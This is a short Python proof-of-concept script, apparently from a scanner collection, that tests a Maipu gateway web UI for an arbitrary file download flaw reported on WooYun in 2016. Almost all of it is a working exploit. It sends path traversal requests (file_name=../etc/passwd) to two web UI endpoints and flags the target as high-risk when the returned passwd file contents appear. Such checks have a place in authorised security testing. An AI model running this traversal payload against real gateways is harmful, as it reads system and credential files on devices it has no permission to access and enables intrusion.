#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 迈普网关webui任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2016-175274
author: Lucifer
description: 迈普网关参数过滤不严导致任意文件下载。
'''
import sys
import requests


class mpsec_webui_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/sh" in req.text:
                return "[+]存在迈普网关webui任意文件下载漏洞...(高危)\tpayload: "+vulnurl
            vulnurl = self.url + "/webui/?g=sys_dia_data_check&file_name=../etc/passwd"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/sh" in req.text:
                return "[+]存在迈普网关webui任意文件下载漏洞...(高危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = mpsec_webui_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()